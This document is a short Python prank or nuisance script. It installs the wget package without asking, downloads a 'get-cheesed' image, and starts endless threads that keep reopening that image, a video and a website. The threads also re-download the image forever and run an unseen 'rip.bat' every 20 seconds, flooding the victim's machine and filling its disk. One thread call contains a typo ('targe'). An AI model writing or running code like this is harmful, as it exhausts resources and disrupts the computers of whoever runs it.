import os
import time
import webbrowser
import threading
import subprocess
os.system('echo off')
os.system('pip install wget')
os.system('python -m pip install wget')

import wget

# Set up the image URL
image_url = "https://i.ibb.co/pJcwYbX/get-cheesed.jpg"

# Use wget download method to download specified image url.
image_filename = wget.download(image_url)
download = True

def infiniteloop1():
    while download == True:
        os.startfile('get-cheesed.jpg')
def infiniteloop2():
    while download == True:
        os.startfile("get cheese try 2.mp4")
        time.sleep(1)
def infiniteloop3():
    while download == True:
        webbrowser.open('http://www.kaasislekker.nl')
def infiniteloop4():
    while download == True:
        image_filename = wget.download(image_url)
def infiniteloop5():
    while download == True:
        time.sleep(20)
        subprocess.call([r'rip.bat'])

thread4 = threading.Thread(target=infiniteloop4)
thread4.start()

thread1 = threading.Thread(target=infiniteloop1)
thread1.start()

thread2 = threading.Thread(target=infiniteloop2)
thread2.start()

thread3 = threading.Thread(target=infiniteloop3)
thread3.start()

thread5 = threading.Thread(targe=infiniteloop5)
thread5.start()
